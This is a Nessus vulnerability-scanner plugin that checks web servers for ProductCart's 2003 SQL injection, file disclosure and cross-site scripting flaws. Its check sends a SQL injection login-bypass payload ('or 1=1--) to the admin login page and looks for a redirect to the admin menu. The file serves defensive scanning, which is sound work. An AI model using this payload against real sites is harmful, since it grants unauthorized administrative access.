# 
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
 script_id(11785);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2003-0522", "CVE-2003-0523", "CVE-2003-1304");
 script_bugtraq_id(8103, 8105, 8108, 8112);
 script_xref(name:"OSVDB", value:"2280");
 script_xref(name:"OSVDB", value:"10096");
 script_xref(name:"OSVDB", value:"10097");
 script_xref(name:"OSVDB", value:"27619");

 script_name(english:"ProductCart Multiple Vulnerabilities");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP application that is affected by
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is using the ProductCart software suite. 

This set of CGIs is vulnerable to a SQL injection bug which may allow
an attacker to take the control of the server as an administrator.  In
addition, the application is susceptible various file disclosure and
cross-site scripting attacks." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2003-07/0030.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2003-07/0057.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2003-q3/0081.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 script_summary(english:"Determine if ProductCart is vulnerable to a sql injection attack");
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if ( ! can_host_asp(port:port) ) exit(0);

foreach dir (cgi_dirs())
{
 r = http_send_recv3(method:"GET", item:dir + "/pcadmin/login.asp?idadmin=''%20or%201=1--", port:port);
 if (isnull(r)) exit(0);
 
 if(egrep(pattern:"^Location: menu\.asp", string:r[1]))
 {
  security_warning(port);
  set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
  exit(0);
 }
}
